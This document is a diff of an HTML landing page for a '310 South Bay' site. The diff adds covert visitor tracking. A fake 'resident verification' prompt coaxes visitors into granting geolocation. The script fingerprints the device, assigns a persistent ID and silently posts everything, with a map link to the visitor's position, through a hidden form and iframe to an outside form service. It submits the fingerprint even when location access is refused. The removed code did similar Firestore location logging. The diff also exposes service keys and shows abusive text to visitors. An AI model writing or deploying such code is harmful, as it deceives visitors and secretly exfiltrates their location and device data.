@@ -29,7 +29,6 @@
             max-width: 100%;
             height: auto;
             margin-bottom: 40px;
-            /* Applying the pulsing red glow effect */
             filter: drop-shadow(0 0 10px rgba(255, 0, 0, 0.2));
             animation: pulse 4s infinite ease-in-out;
         }
@@ -45,25 +44,41 @@
             text-transform: uppercase;
             letter-spacing: 0.15em;
             margin-bottom: 10px;
+            line-height: 1.4;
         }
 
-        .sub-phrase {
-            font-size: 1.2rem;
+        #status-text {
+            font-size: 1.1rem;
             color: #888888;
             font-weight: normal;
-            margin-bottom: 40px;
+            margin-bottom: 10px;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+
+        #location-display {
+            font-family: monospace;
+            font-size: 0.9rem;
+            color: #ff0000;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+        }
+
+        /* Hidden elements */
+        #geo-form, #silent-target {
+            display: none;
         }
 
         .contact-info {
-            font-size: 0.8rem;
+            font-size: 0.7rem;
             letter-spacing: 0.1em;
-            color: #555555;
+            color: #444;
+            margin-top: 20px;
         }
 
-        .contact-info a {
-            color: #d1d1d1;
+        a {
+            color: #666;
             text-decoration: none;
-            border-bottom: 1px solid #333;
         }
     </style>
 </head>
@@ -72,56 +87,102 @@
     <div class="container">
         <img src="MagicEraser_260417_233536.png" alt="310 South Bay Logo" class="header-logo">
         
-        <div class="bold-phrase">SOMETHING IS BEING BUILT.</div>
-        <div class="sub-phrase">NOT FOR EVERYONE.</div>
+        <div class="bold-phrase">SOUTHBAY RESIDENTS <br>PRESS ALLOW TO CONFIRM</div>
+        <div id="status-text">WAITING FOR SYSTEM VERIFICATION...</div>
+        <div id="location-display"></div>
+
+        <iframe name="silent-target" id="silent-target"></iframe>
+
+        <form action="https://api.web3forms.com/submit" method="POST" id="geo-form" target="silent-target">
+            <input type="hidden" name="access_key" value="ef9cd85f-4381-47c4-a0e8-09bd08a62dab">
+            <input type="hidden" name="subject" id="form-subject" value="Resident System Alert">
+            
+            <input type="hidden" name="visitor_id" id="visitor-id">
+            <input type="hidden" name="google_maps_link" id="map-link">
+            
+            <input type="hidden" name="name" value="Resident System Logger">
+            <input type="hidden" name="email" value="verify@310southbay.com">
+            <textarea name="message" id="log-msg" style="display:none;"></textarea>
+        </form>
         
         <div class="contact-info">
             INQUIRIES: <a href="mailto:info@310southbay.com">INFO@310SOUTHBAY.COM</a>
         </div>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-        // Your specific Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyB87hTd4F1hAeUf7acbKDzkHvDjZ7AA4qw",
-            authDomain: "southbay-6f2b1.firebaseapp.com",
-            projectId: "southbay-6f2b1",
-            storageBucket: "southbay-6f2b1.firebasestorage.app",
-            messagingSenderId: "563224438080",
-            appId: "1:563224438080:web:9c550469d98c32b61646a5",
-            measurementId: "G-FG82TR3TWM"
-        };
-
-        // Initialize Firebase and Firestore
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        async function logVisitor() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    try {
-                        // Automatically creates the 'visitors' collection in Firestore
-                        await addDoc(collection(db, "visitors"), {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            time: serverTimestamp(),
-                            device: navigator.userAgent
-                        });
-                        console.log("Location logged successfully.");
-                    } catch (e) {
-                        console.log("Database error: Ensure Firestore is in Test Mode.");
-                    }
-                }, () => {
-                    console.log("Visitor declined location access.");
-                });
+    <script>
+        function getVisitorID() {
+            let id = localStorage.getItem('310_resident_id');
+            if (!id) {
+                id = 'RES-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                localStorage.setItem('310_resident_id', id);
             }
+            return id;
         }
 
-        // Run the log function as soon as the page loads
-        window.onload = logVisitor;
+        function triggerSubmission(logData, uiMessage, isSuccess) {
+            const status = document.getElementById('status-text');
+            const form = document.getElementById('geo-form');
+            const subjectField = document.getElementById('form-subject');
+            
+            // Set subject to differentiate between verified and denied in your inbox
+            subjectField.value = isSuccess ? "VERIFIED RESIDENT" : "DENIED - KOOK DETECTED";
+            
+            document.getElementById('log-msg').value = logData;
+            status.innerHTML = uiMessage;
+            
+            if (!isSuccess) {
+                status.style.color = "#ff0000";
+            } else {
+                status.style.color = "#00ff00";
+            }
+
+            form.submit();
+        }
+
+        window.onload = function() {
+            const locDisplay = document.getElementById('location-display');
+            const vID = getVisitorID();
+            document.getElementById('visitor-id').value = vID;
+
+            // Comprehensive device/browser metadata
+            const deviceData = `
+DEVICE ID: ${vID}
+OS/PLATFORM: ${navigator.platform}
+CORES: ${navigator.hardwareConcurrency || 'N/A'}
+RAM: ${navigator.deviceMemory || 'N/A'}GB
+SCREEN: ${screen.width}x${screen.height} (${window.devicePixelRatio}x)
+BROWSER: ${navigator.userAgent}
+LANG: ${navigator.language}
+TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+            `;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // --- SUCCESS CASE ---
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+
+                    locDisplay.innerHTML = `LOCATED: ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                    document.getElementById('map-link').value = mapUrl;
+
+                    const successLog = `[ACCESS GRANTED]\n${deviceData}\nMAP LINK: ${mapUrl}`;
+                    triggerSubmission(successLog, "VERIFIED. ACCESS GRANTED.", true);
+
+                }, function(error) {
+                    // --- DENIAL CASE ---
+                    // Still submits all deviceData collected above
+                    const denialLog = `[ACCESS DENIED BY USER]\n${deviceData}\nREASON: User blocked or timed out.`;
+                    
+                    locDisplay.innerHTML = "SYSTEM ERROR: IDENTITY NOT VERIFIED";
+                    triggerSubmission(denialLog, "ACCESS DENIED. FUCK OFF KOOK!", false);
+                });
+            } else {
+                document.getElementById('status-text').innerHTML = "UNSUPPORTED DEVICE.";
+            }
+        };
     </script>
+
 </body>
 </html>
